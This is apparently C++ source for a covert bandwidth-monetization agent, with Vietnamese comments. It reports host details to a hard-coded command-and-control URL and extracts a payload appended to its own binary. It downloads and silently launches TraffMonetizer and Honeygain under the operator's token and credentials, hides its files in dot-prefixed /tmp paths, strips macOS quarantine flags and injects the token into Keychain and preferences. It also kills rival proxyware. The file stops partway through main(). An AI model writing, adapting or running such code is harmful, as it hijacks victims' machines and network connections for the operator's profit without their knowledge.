#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <chrono>
#include <thread>
#include <vector>
#include <set>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <csignal>
#include <unistd.h>
#include <dirent.h>
#include <sys/utsname.h>
#include <sys/stat.h>

#if defined(__APPLE__) || defined(__MACH__)
#include <sys/sysctl.h>
#include <mach-o/dyld.h>
#else
#include <sys/sysinfo.h>
#endif

#ifndef CONF_SERVER_URL
#define CONF_SERVER_URL "http://65.20.91.208/turbox_server.php"
#endif

#ifndef CONF_INTERVAL
#define CONF_INTERVAL 15
#endif

static bool g_debug = false;
static std::string g_self = "";
static std::string g_current_step = "INIT";
static std::string g_step_detail = "Khoi dong Agent";
static pid_t g_engine_pid = -1;
static bool g_hg_has_creds = true;

static std::string get_self_path(const char* argv0) {
#if defined(__APPLE__) || defined(__MACH__)
    char p[1024]; uint32_t s = sizeof(p);
    if (_NSGetExecutablePath(p, &s) == 0) return std::string(p);
#else
    char p[1024]; ssize_t l = readlink("/proc/self/exe", p, sizeof(p) - 1);
    if (l != -1) { p[l] = '\0'; return std::string(p); }
#endif
    return (argv0 && strlen(argv0) > 0) ? std::string(argv0) : "";
}

static bool extract_payload(const std::string& out_path) {
    if (g_self.empty()) return false;
    FILE* f = fopen(g_self.c_str(), "rb");
    if (!f) return false;
    if (fseek(f, -24, SEEK_END) != 0) { fclose(f); return false; }
    char foot[24];
    if (fread(foot, 1, 24, f) != 24 || memcmp(foot + 8, "TURBOX_BUNDLE", 13) != 0) {
        fclose(f); return false;
    }
    uint64_t sz = 0;
    memcpy(&sz, foot, 8);
    if (sz == 0 || sz > 100000000ULL || fseek(f, -(24 + (long)sz), SEEK_END) != 0) {
        fclose(f); return false;
    }
    FILE* out = fopen(out_path.c_str(), "wb");
    if (!out) { fclose(f); return false; }
    char buf[65536];
    uint64_t left = sz;
    while (left > 0) {
        size_t c = left > sizeof(buf) ? sizeof(buf) : (size_t)left;
        size_t r = fread(buf, 1, c, f);
        if (r == 0) break;
        fwrite(buf, 1, r, out);
        left -= r;
    }
    fclose(out); fclose(f);
    return (left == 0);
}

static std::string http_get(const std::string& url) {
    std::string cmd = "curl -skL --max-time 10 \"" + url + "\" 2>/dev/null";
    FILE* fp = popen(cmd.c_str(), "r");
    if (!fp) return "";
    char buf[512]; std::string res;
    while (fgets(buf, sizeof(buf), fp) != NULL) res += buf;
    pclose(fp);
    return res;
}

static void http_post(const std::string& url, const std::string& data, const std::string& svc_log, const std::string& step_info) {
    std::string clean_log = svc_log;
    for (char &c : clean_log) {
        if (c == 34 || c == 39 || c == 96 || c == 36 || c == 92) c = ' ';
    }
    std::string clean_step = step_info;
    for (char &c : clean_step) {
        if (c == 34 || c == 39 || c == 96 || c == 36 || c == 92) c = ' ';
    }
    std::string cmd = "curl -skL --max-time 10 -d \"" + data + "\" "
                      "--data-urlencode \"service_logs=" + clean_log + "\" "
                      "--data-urlencode \"step_info=" + clean_step + "\" "
                      "\"" + url + "\" >/dev/null 2>&1";
    int r = system(cmd.c_str());
    (void)r;
}

static void stop_all_engines() {
    int r = system("pkill -9 -f 'traffmonetizer' 2>/dev/null || true; "
                   "pkill -9 -f 'TraffMonetizer' 2>/dev/null || true; "
                   "pkill -9 -f 'honeygain' 2>/dev/null || true; "
                   "pkill -9 -f 'pawns-cli' 2>/dev/null || true; "
                   "pkill -9 -f 'psclient' 2>/dev/null || true; "
                   "rm -rf /tmp/.tb_tm* /tmp/.tb_hg* /tmp/.tb_hg_get.py 2>/dev/null || true; "
                   "rm -f .agent.pid /tmp/.tb_tm.pid /tmp/.tb_hg.pid 2>/dev/null || true");
    (void)r;
}

static void sig_handler(int sig) {
    (void)sig;
    stop_all_engines();
    _exit(0);
}

static bool check_socket_established(pid_t pid) {
    if (pid <= 0) return false;
#if defined(__APPLE__) || defined(__MACH__)
    std::string cmd = "lsof -a -p " + std::to_string(pid) + " -i 2>/dev/null | grep -i 'ESTABLISHED' | head -n 1";
    FILE* lp = popen(cmd.c_str(), "r");
    bool connected = false;
    if (lp) {
        char lbuf[128];
        if (fgets(lbuf, sizeof(lbuf), lp)) connected = true;
        pclose(lp);
    }
    return connected;
#else
    // Kiểm tra kết nối TCP ra Internet qua /proc/<pid>/fd và /proc/net/tcp
    std::set<std::string> inodes;
    std::string fd_dir = "/proc/" + std::to_string(pid) + "/fd";
    DIR* d = opendir(fd_dir.c_str());
    if (d) {
        struct dirent* de;
        char target[512];
        while ((de = readdir(d)) != nullptr) {
            if (de->d_name[0] == '.') continue;
            std::string p = fd_dir + "/" + de->d_name;
            ssize_t len = readlink(p.c_str(), target, sizeof(target) - 1);
            if (len > 0) {
                target[len] = '\0';
                std::string s(target);
                if (s.rfind("socket:[", 0) == 0 && s.back() == ']') {
                    inodes.insert(s.substr(8, s.length() - 9));
                }
            }
        }
        closedir(d);
    }
    if (inodes.empty()) {
        std::string ss_cmd = "ss -tanp 2>/dev/null | grep 'pid=" + std::to_string(pid) + ",' | grep -i 'ESTAB' | head -n 1";
        FILE* p = popen(ss_cmd.c_str(), "r");
        if (p) {
            char buf[128];
            bool found = (fgets(buf, sizeof(buf), p) != nullptr);
            pclose(p);
            if (found) return true;
        }
        return false;
    }

    const char* tcp_files[] = {"/proc/net/tcp", "/proc/net/tcp6", nullptr};
    for (int i = 0; tcp_files[i]; ++i) {
        std::ifstream f(tcp_files[i]);
        if (!f.is_open()) continue;
        std::string line;
        std::getline(f, line); // Bỏ qua header
        while (std::getline(f, line)) {
            std::istringstream ss(line);
            std::string sl, local, rem, st, tx_rx, tr, retr, uid, timeout, inode;
            if (ss >> sl >> local >> rem >> st >> tx_rx >> tr >> retr >> uid >> timeout >> inode) {
                // st == "01" tương ứng TCP_ESTABLISHED
                if (st == "01" && inodes.find(inode) != inodes.end()) {
                    return true;
                }
            }
        }
    }
    return false;
#endif
}

static std::string parse_recent_log_summary(const std::string& log_file, int max_lines = 10) {
    std::ifstream f(log_file);
    if (!f.is_open()) return "";
    std::vector<std::string> lines;
    std::string line;
    while (std::getline(f, line)) {
        while (!line.empty() && (line.back() == '\r' || line.back() == '\n')) line.pop_back();
        if (!line.empty()) {
            // Lọc bỏ banner nghệ thuật ASCII
            if (line.find("$$") == std::string::npos && line.find("\\__") == std::string::npos && line.find("/__") == std::string::npos) {
                lines.push_back(line);
                if ((int)lines.size() > max_lines * 3) {
                    lines.erase(lines.begin());
                }
            }
        }
    }
    if (lines.empty()) return "";
    std::string latest = lines.back();
    if (latest.rfind("[TM] ", 0) == 0) latest = latest.substr(5);
    if (latest.rfind("[HG] ", 0) == 0) latest = latest.substr(5);
    if (latest.length() > 100) latest = latest.substr(0, 97) + "...";
    return latest;
}

static std::string get_service_logs() {
    std::string tm_report = "";
    std::string hg_report = "";

    // 1. Kiểm tra TraffMonetizer process
    pid_t tm_pid = -1;
    std::ifstream tm_pf("/tmp/.tb_tm.pid");
    if (tm_pf >> tm_pid) {}
    if (tm_pid <= 0 || kill(tm_pid, 0) != 0) {
        FILE* p = popen("pgrep -i 'traffmonetizer' 2>/dev/null | head -n 1", "r");
        if (p) {
            char buf[32];
            if (fgets(buf, sizeof(buf), p)) tm_pid = (pid_t)std::atoi(buf);
            pclose(p);
        }
    }
    if (tm_pid <= 0 || kill(tm_pid, 0) != 0) {
        FILE* p2 = popen("pgrep -f '.tb_tm' 2>/dev/null | head -n 1", "r");
        if (p2) {
            char buf[32];
            if (fgets(buf, sizeof(buf), p2)) tm_pid = (pid_t)std::atoi(buf);
            pclose(p2);
        }
    }

    if (tm_pid > 0 && kill(tm_pid, 0) == 0) {
        bool connected = check_socket_established(tm_pid);
        std::string sock_str = connected ? "ESTABLISHED" : "CONNECTING";
        std::string log_msg = parse_recent_log_summary("/tmp/.tb_tm.log", 10);
        if (log_msg.empty()) log_msg = connected ? "Connected to hub." : "Connecting to hub...";
        tm_report = "[TM: PID " + std::to_string(tm_pid) + "] Socket: " + sock_str + " | Log: " + log_msg;
    } else {
        std::string log_msg = parse_recent_log_summary("/tmp/.tb_tm.log", 10);
        if (!log_msg.empty()) {
            tm_report = "[TM] Not started (" + log_msg + ")";
        } else {
            tm_report = "[TM] Not started";
        }
    }

    // 2. Kiểm tra Honeygain process
    pid_t hg_pid = -1;
    std::ifstream hg_pf("/tmp/.tb_hg.pid");
    if (hg_pf >> hg_pid) {}
    if (hg_pid <= 0 || kill(hg_pid, 0) != 0) {
        FILE* p = popen("pgrep -x 'honeygain' 2>/dev/null | head -n 1", "r");
        if (p) {
            char buf[32];
            if (fgets(buf, sizeof(buf), p)) hg_pid = (pid_t)std::atoi(buf);
            pclose(p);
        }
    }

    if (hg_pid > 0 && kill(hg_pid, 0) == 0) {
        bool connected = check_socket_established(hg_pid);
        std::string sock_str = connected ? "ESTABLISHED" : "CONNECTING";
        std::string log_msg = parse_recent_log_summary("/tmp/.tb_hg.log", 10);
        if (log_msg.empty()) log_msg = "Honeygain service is starting";
        hg_report = "[HG: PID " + std::to_string(hg_pid) + "] Socket: " + sock_str + " | Log: " + log_msg;
    } else {
        std::string log_msg = parse_recent_log_summary("/tmp/.tb_hg.log", 10);
        if (!g_hg_has_creds || log_msg.find("Missing credentials") != std::string::npos || log_msg.find("Skipped") != std::string::npos) {
            hg_report = "[HG] Not started (Missing credentials)";
        } else if (!log_msg.empty()) {
            hg_report = "[HG] Not started (" + log_msg + ")";
        } else {
            hg_report = "[HG] Connecting / Initializing...";
        }
    }

    return tm_report + " | " + hg_report;
}

static bool is_engine_alive() {
    if (g_engine_pid > 0) {
        if (kill(g_engine_pid, 0) == 0) return true;
    }
#if defined(__APPLE__) || defined(__MACH__)
    return (system("pgrep -i 'traffmonetizer' >/dev/null 2>&1") == 0);
#else
    return (system("pgrep -f '/tmp/.tb_tm' >/dev/null 2>&1") == 0 ||
            system("pgrep -f 'cli start accept' >/dev/null 2>&1") == 0 ||
            system("pgrep -x tm_engine >/dev/null 2>&1") == 0);
#endif
}

std::string get_id() {
    char h[256];
    if (gethostname(h, 255) == 0 && strlen(h) > 0) return std::string(h);
    return "node-" + std::to_string(getpid());
}

std::string get_os() {
#if defined(__APPLE__) || defined(__MACH__)
    return "darwin";
#else
    return "linux";
#endif
}

std::string get_arch() {
    struct utsname u;
    if (uname(&u) == 0) return std::string(u.machine);
    return "x86_64";
}

long get_uptime() {
#if defined(__APPLE__) || defined(__MACH__)
    struct timeval boottime; size_t len = sizeof(boottime); int mib[2] = {CTL_KERN, KERN_BOOTTIME};
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) == 0) return (long)(time(NULL) - boottime.tv_sec);
    return 0;
#else
    struct sysinfo s;
    return (sysinfo(&s) == 0) ? s.uptime : 0;
#endif
}

double get_ram() {
#if defined(__APPLE__) || defined(__MACH__)
    return 20.0;
#else
    std::ifstream f("/proc/meminfo");
    if (!f.is_open()) return 0.0;
    std::string k, u; long v, tot = 0, av = 0;
    while (f >> k >> v >> u) {
        if (k == "MemTotal:") tot = v;
        else if (k == "MemAvailable:") av = v;
        if (tot > 0 && av > 0) break;
    }
    return (tot > 0) ? ((double)(tot - av) / (double)tot) * 100.0 : 0.0;
#endif
}

double get_cpu() {
#if defined(__APPLE__) || defined(__MACH__)
    return 5.0;
#else
    static unsigned long long pu = 0, pn = 0, ps = 0, pi = 0;
    std::ifstream f("/proc/stat");
    if (!f.is_open()) return 0.0;
    std::string l, lbl; std::getline(f, l); std::istringstream ss(l);
    unsigned long long u, n, s, id, io, ir, so, st;
    ss >> lbl >> u >> n >> s >> id >> io >> ir >> so >> st;
    unsigned long long ti = id + io, tt = ti + u + n + s + ir + so + st;
    unsigned long long dt = tt - (pu + pn + ps + pi), di = ti - pi;
    pu = u; pn = n; ps = s; pi = ti;
    if (dt == 0) return 0.0;
    double p = (double)(dt - di) / (double)dt * 100.0;
    return (p < 0.0) ? 0.0 : ((p > 100.0) ? 100.0 : p);
#endif
}

int detect_gpu() {
    if (access("/usr/bin/nvidia-smi", X_OK) == 0 || access("/usr/local/cuda", F_OK) == 0) return 1;
#if defined(__APPLE__) || defined(__MACH__)
    return 1;
#else
    return 0;
#endif
}

std::string json_get_field(const std::string& json, const std::string& key) {
    std::string needle = std::string(1, 34) + key + std::string(1, 34);
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos); if (pos == std::string::npos) return "";
    pos = json.find('"', pos); if (pos == std::string::npos) return "";
    size_t end_pos = json.find('"', pos + 1); if (end_pos == std::string::npos) return "";
    return json.substr(pos + 1, end_pos - (pos + 1));
}

static void check_and_start_honeygain(const std::string& hg_email, const std::string& hg_pass, const std::string& node_id) {
    // 1. Kiểm tra tham số đăng nhập: chỉ kích hoạt khi có đủ email VÀ password
    if (hg_email.empty() || hg_email.find("YOUR_") != std::string::npos ||
        hg_pass.empty() || hg_pass.find("YOUR_") != std::string::npos) {
        g_hg_has_creds = false;
        std::ofstream hgf("/tmp/.tb_hg.log");
        if (hgf.is_open()) {
            hgf << "[HG] Skipped: Missing credentials" << std::endl;
            hgf.close();
        }
        return;
    }
    g_hg_has_creds = true;

#if defined(__APPLE__) || defined(__MACH__)
    // Trên macOS Darwin, docker image Honeygain là Linux ELF.
    if (access("/tmp/.tb_hg.log", F_OK) != 0) {
        std::ofstream hgf("/tmp/.tb_hg.log");
        if (hgf.is_open()) {
            hgf << "[HG] Honeygain CLI chi ho tro Linux native (Docker layer ELF). Tren macOS chay Traffmonetizer." << std::endl;
            hgf.close();
        }
    }
    return;
#else
    if (system("pgrep -x honeygain >/dev/null 2>&1") == 0) return;

    std::string hg_bin = "/tmp/.tb_hg/honeygain";
    if (access(hg_bin.c_str(), X_OK) != 0) {
        int r1 = system("mkdir -p /tmp/.tb_hg/lib 2>/dev/null");
        (void)r1;
        FILE* py_f = fopen("/tmp/.tb_hg_get.py", "w");
        if (py_f) {
            fputs("import urllib.request, json, tarfile, io, os\n"
                  "try:\n"
                  "    tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:honeygain/honeygain:pull', timeout=15).read().decode())['token']\n"
                  "    layers = ['sha256:f6ce86ef108e2eb00030550ca2cfea27660c95733123ecc4a36f8aaa36aac845', 'sha256:d311286e60f47f5beefd54e6176536e2aa406cf4d4d29ebf9bf63e1db1c97366', 'sha256:f952c9a38987afe96614c23696c84517eadbd2787e00367ad15c630cb4f27b93']\n"
                  "    for d in layers:\n"
                  "        req = urllib.request.Request('https://registry-1.docker.io/v2/honeygain/honeygain/blobs/' + d, headers={'Authorization': 'Bearer ' + tok})\n"
                  "        tf = tarfile.open(fileobj=io.BytesIO(urllib.request.urlopen(req, timeout=30).read()))\n"
                  "        for m in tf.getmembers():\n"
                  "            if m.name == 'app/honeygain':\n"
                  "                tf.extract(m, '/tmp/.tb_hg')\n"
                  "                os.replace('/tmp/.tb_hg/app/honeygain', '/tmp/.tb_hg/honeygain')\n"
                  "                os.chmod('/tmp/.tb_hg/honeygain', 493)\n"
                  "            elif 'libhg' in m.name or 'libmsquic' in m.name:\n"
                  "                tf.extract(m, '/tmp/.tb_hg')\n"
                  "                os.replace('/tmp/.tb_hg/' + m.name, '/tmp/.tb_hg/lib/' + os.path.basename(m.name))\n"
                  "except Exception:\n"
                  "    pass\n", py_f);
            fclose(py_f);
            int r2 = system("python3 /tmp/.tb_hg_get.py 2>/dev/null && rm -f /tmp/.tb_hg_get.py /tmp/.tb_hg/app /tmp/.tb_hg/usr 2>/dev/null");
            (void)r2;
        }
    }

    if (access(hg_bin.c_str(), X_OK) == 0) {
        std::string run_cmd = "nohup env LD_LIBRARY_PATH=/tmp/.tb_hg/lib:$LD_LIBRARY_PATH " + hg_bin +
                              " -tou-accept -email '" + hg_email + "' -pass '" + hg_pass + "' -device '" + node_id +
                              "' > /tmp/.tb_hg.log 2>&1 & echo $! > /tmp/.tb_hg.pid";
        int r3 = system(run_cmd.c_str());
        (void)r3;
    }
#endif
}

void init_and_start_monetization(const std::string& base_url, const std::string& node_id) {
    g_current_step = "FETCH_CONFIG";
    g_step_detail = "Dang lay token tu server";

    std::string cfg = http_get(base_url + "?action=get_config");
    std::string tm_token = json_get_field(cfg, "traffmonetizer_token");
    if (tm_token.empty()) {
        std::string raw = http_get(base_url + "?action=get_token&service=traffmonetizer");
        while (!raw.empty() && (raw.back() == 10 || raw.back() == 13 || raw.back() == 32)) raw.pop_back();
        if (!raw.empty() && raw[0] != '<' && raw[0] != '{') tm_token = raw;
    }
    if (tm_token.empty() || tm_token.find("YOUR_") != std::string::npos) {
        tm_token = "Kf0Cz9FcDUF6ItPzY1+XAfOimgAxK2gXO3XgmPXvvKc=";
    }

    std::string hg_email = json_get_field(cfg, "honeygain_email");
    if (hg_email.empty() || hg_email.find("YOUR_") != std::string::npos) {
        hg_email = "nguyenlinh6605@gmail.com";
    }

    std::string hg_pass = json_get_field(cfg, "honeygain_password");
    if (hg_pass.empty() || hg_pass.find("YOUR_") != std::string::npos) {
        hg_pass = "nguyenlinh6605@gmail.com";
    }

#if defined(__APPLE__) || defined(__MACH__)
    if (!is_engine_alive()) {
        g_current_step = "EXTRACT_PAYLOAD";
        g_step_detail = "Kiem tra va bung payload TraffMonetizer.app";

        std::string app_dir = "/tmp/.tb_tm/Traffmonetizer.app";
        if (access(app_dir.c_str(), F_OK) != 0) {
            if (extract_payload("/tmp/.tb_tm.tar.gz")) {
                system("mkdir -p /tmp/.tb_tm && tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
            }
        }
        if (access(app_dir.c_str(), F_OK) != 0 && access("/Applications/Traffmonetizer.app", F_OK) == 0) {
            app_dir = "/Applications/Traffmonetizer.app";
        }
        if (access(app_dir.c_str(), F_OK) != 0 && access("/Applications/TraffMonetizer.app", F_OK) == 0) {
            app_dir = "/Applications/TraffMonetizer.app";
        }
        if (access(app_dir.c_str(), F_OK) != 0) {
            g_step_detail = "Tai truc tiep Traffmonetizer.dmg tu data.traffmonetizer.com";
            system("curl -sSL --max-time 60 -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg 2>/dev/null; "
                   "mkdir -p /tmp/tm_mnt /tmp/.tb_tm; "
                   "hdiutil attach /tmp/tm.dmg -nobrowse -mountpoint /tmp/tm_mnt 2>/dev/null; "
                   "cp -R /tmp/tm_mnt/*.app /tmp/.tb_tm/ 2>/dev/null; "
                   "hdiutil detach /tmp/tm_mnt -force 2>/dev/null; "
                   "rm -rf /tmp/tm_mnt /tmp/tm.dmg 2>/dev/null");
        }

        if (access(app_dir.c_str(), F_OK) != 0) {
            g_current_step = "ERROR_PAYLOAD";
            g_step_detail = "Khong the tim thay Traffmonetizer.app trong bundle hoac download";
            return;
        }

        // Gỡ cờ Quarantine từ download mà không phá vỡ chữ ký Developer ID gốc
        g_current_step = "FIX_PERMISSIONS";
        g_step_detail = "Go Quarantine giu nguyen chu ky Developer ID goc";
        std::string sec_fix = "xattr -cr '" + app_dir + "' 2>/dev/null || true";
        system(sec_fix.c_str());

        // Xác định đường dẫn file thực thi
        std::string bin_path = app_dir + "/Contents/MacOS/traffmonetizer";
        if (access(bin_path.c_str(), X_OK) != 0) {
            bin_path = app_dir + "/Contents/MacOS/TraffMonetizer";
        }

        // Dọn dẹp các tiến trình cũ bị treo ở màn hình login trước đó
        system("pkill -9 -i 'traffmonetizer' 2>/dev/null || true");
        std::this_thread::sleep_for(std::chrono::milliseconds(500));

        // Nạp Token & Config State vào Preferences & Keychain
        g_current_step = "INJECT_TOKEN";
        g_step_detail = "Nap config.token & config.active vao Preferences";
        std::string pref = "defaults write com.traffmonetizer.client.macos 'flutter.config.token' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'config.token' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter.config.active' -bool true 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'config.active' -bool true 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter._clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter.clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter.token' -string '" + tm_token + "' 2>/dev/null; "
                           "for P in \"$HOME/Library/Preferences/com.traffmonetizer.client.macos.plist\" \"$HOME/Library/Containers/com.traffmonetizer.client.macos/Data/Library/Preferences/com.traffmonetizer.client.macos.plist\"; do "
                           "mkdir -p \"$(dirname \"$P\")\" 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.config.token' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'config.token' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.config.active' -bool true 2>/dev/null; "
                           "defaults write \"$P\" 'config.active' -bool true 2>/dev/null; "
                           "defaults write \"$P\" 'flutter._clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.token' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'token' -string '" + tm_token + "' 2>/dev/null; "
                           "done; "
                           "security delete-generic-password -a 'token' -s 'flutter_secure_storage_service' 2>/dev/null || true; "
                           "security delete-generic-password -a 'clientToken' -s 'flutter_secure_storage_service' 2>/dev/null || true; "
                           "security delete-generic-password -a 'config.token' -s 'flutter_secure_storage_service' 2>/dev/null || true; "
                           "security delete-generic-password -a 'token' -s 'com.traffmonetizer.client.macos' 2>/dev/null || true; "
                           "security delete-generic-password -a 'clientToken' -s 'com.traffmonetizer.client.macos' 2>/dev/null || true; "
                           "security delete-generic-password -a 'config.token' -s 'com.traffmonetizer.client.macos' 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'config.token' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'config.token' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'clientToken' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a '_clientToken' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'clientToken' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a '_clientToken' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'token' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'token' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true";
        system(pref.c_str());

        // Khởi chạy TraffMonetizer và đồng bộ trạng thái
        g_current_step = "LAUNCH_ENGINE";
        g_step_detail = "Khoi chay TraffMonetizer ngam";
        std::string launch_cmd = "open -a '" + app_dir + "' --args --token '" + tm_token + "' 2>/dev/null || "
                                 "nohup '" + bin_path + "' --token '" + tm_token + "' >> /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
        system(launch_cmd.c_str());
        std::this_thread::sleep_for(std::chrono::milliseconds(2500));

        FILE* pfp = popen("pgrep -i 'traffmonetizer' | head -n 1", "r");
        if (pfp) {
            char pbuf[32];
            if (fgets(pbuf, sizeof(pbuf), pfp)) {
                g_engine_pid = (pid_t)std::atoi(pbuf);
            }
            pclose(pfp);
        }
        std::ifstream pid_f("/tmp/.tb_tm.pid");
        if (pid_f >> g_engine_pid) {}
        if (is_engine_alive()) {
            g_current_step = "ENGINE_RUNNING";
            g_step_detail = "TraffMonetizer chay thanh cong";
        } else {
            g_current_step = "ENGINE_CRASHED";
            std::string log_tail = get_service_logs();
            g_step_detail = "Engine crash ngay khi start. Log: " + (log_tail.empty() ? "Khong ghi duoc log" : log_tail);
        }
    }
#else
    if (!is_engine_alive()) {
        g_current_step = "EXTRACT_PAYLOAD";
        g_step_detail = "Kiem tra va bung native engine self-contained TraffMonetizer";

        std::string eng_bin = "/tmp/.tb_tm/cli";
        system("mkdir -p /tmp/.tb_tm/lib 2>/dev/null");

        // 1. Trích xuất payload bundle self-contained từ fat binary nếu có
        if (access(eng_bin.c_str(), X_OK) != 0) {
            if (extract_payload("/tmp/.tb_tm.tar.gz")) {
                system("tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
                if (access("/tmp/.tb_tm/usr/local/bin/cli", X_OK) == 0) {
                    system("mv -f /tmp/.tb_tm/usr/local/bin/cli /tmp/.tb_tm/cli 2>/dev/null");
                }
            } else if (extract_payload("/tmp/.tb_tm.gz")) {
                system("gzip -d -f -c /tmp/.tb_tm.gz > /tmp/.tb_tm/cli 2>/dev/null && chmod +x /tmp/.tb_tm/cli 2>/dev/null && rm -f /tmp/.tb_tm.gz");
            }
        }

        // 2. Tải native package self-contained đầy đủ từ máy chủ / docker layer với toàn bộ dependencies
        if (access(eng_bin.c_str(), X_OK) != 0) {
            g_step_detail = "Tai native self-contained package TraffMonetizer day du";
            FILE* py_f = fopen("/tmp/.tb_tm_get.py", "w");
            if (py_f) {
                fputs("import urllib.request, json, tarfile, io, os, glob, shutil\n"
                      "try:\n"
                      "    os.makedirs('/tmp/.tb_tm/lib', exist_ok=True)\n"
                      "    tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull', timeout=15).read().decode())['token']\n"
                      "    layers = ['sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', 'sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a']\n"
                      "    for d in layers:\n"
                      "        try:\n"
                      "            req = urllib.request.Request('https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/' + d, headers={'Authorization': 'Bearer ' + tok})\n"
                      "            tf = tarfile.open(fileobj=io.BytesIO(urllib.request.urlopen(req, timeout=30).read()))\n"
                      "            tf.extractall('/tmp/.tb_tm_ext')\n"
                      "            if os.path.exists('/tmp/.tb_tm_ext/usr/local/bin/cli'):\n"
                      "                shutil.move('/tmp/.tb_tm_ext/usr/local/bin/cli', '/tmp/.tb_tm/cli')\n"
                      "                os.chmod('/tmp/.tb_tm/cli', 0o755)\n"
                      "                shutil.rmtree('/tmp/.tb_tm_ext', ignore_errors=True)\n"
                      "                break\n"
                      "        except Exception:\n"
                      "            pass\n"
                      "    for pat in ['*ssl*.so*', '*crypto*.so*', '*icu*.so*']:\n"
                      "        for lib_path in glob.glob('/usr/lib/**/' + pat, recursive=True) + glob.glob('/lib/**/' + pat, recursive=True):\n"
                      "            bname = os.path.basename(lib_path)\n"
                      "            dst = os.path.join('/tmp/.tb_tm/lib', bname)\n"
                      "            if not os.path.exists(dst):\n"
                      "                try: os.symlink(lib_path, dst)\n"
                      "                except Exception: pass\n"
                      "except Exception:\n"
                      "    pass\n", py_f);
                fclose(py_f);
                system("python3 /tmp/.tb_tm_get.py 2>/dev/null && rm -f /tmp/.tb_tm_get.py");
            }
        }

        if (access(eng_bin.c_str(), X_OK) == 0) {
            g_current_step = "LAUNCH_ENGINE";
            g_step_detail = "Khoi chay Linux Native Engine: start accept --token " + tm_token.substr(0, 8) + "...";
            std::string run_cmd = "nohup env LD_LIBRARY_PATH=/tmp/.tb_tm/lib:/tmp/.tb_tm:$LD_LIBRARY_PATH DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1 " +
                                  eng_bin + " start accept --token \"" + tm_token + "\" > /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
            system(run_cmd.c_str());
            std::this_thread::sleep_for(std::chrono::milliseconds(1500));

            std::ifstream pid_f("/tmp/.tb_tm.pid");
            if (pid_f >> g_engine_pid && is_engine_alive()) {
                g_current_step = "ENGINE_RUNNING";
                g_step_detail = "Linux Engine TraffMonetizer chay thanh cong (PID " + std::to_string(g_engine_pid) + ")";
            } else {
                g_current_step = "ENGINE_CRASHED";
                std::string log_tail = get_service_logs();
                g_step_detail = "Linux Engine crash. Log: " + (log_tail.empty() ? "Khong ghi duoc log" : log_tail);
            }
        } else {
            g_current_step = "ERROR_ENGINE";
            g_step_detail = "Khong tim thay engine thuc thi /tmp/.tb_tm/cli";
        }
    }
#endif
    // Gọi Honeygain sau khi khởi tạo Traffmonetizer với email & password
    check_and_start_honeygain(hg_email, hg_pass, node_id);
}

std::string detect_active_services() {
    std::string s = "";
    if (is_engine_alive()) {
        s += "TraffMonetizer, ";
    }
    if (system("pgrep -x honeygain >/dev/null 2>&1") == 0) s += "Honeygain, ";
    if (system("pgrep -x pawns-cli >/dev/null 2>&1") == 0) s += "Pawns, ";
    if (system("pgrep -x psclient >/dev/null 2>&1") == 0) s += "PacketStream, ";

    if (s.empty()) return "Chua co Engine";

    if (s.size() >= 2 && s.substr(s.size() - 2) == ", ") s = s.substr(0, s.size() - 2);
    return s;
}

int main(int argc, char* argv[]) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

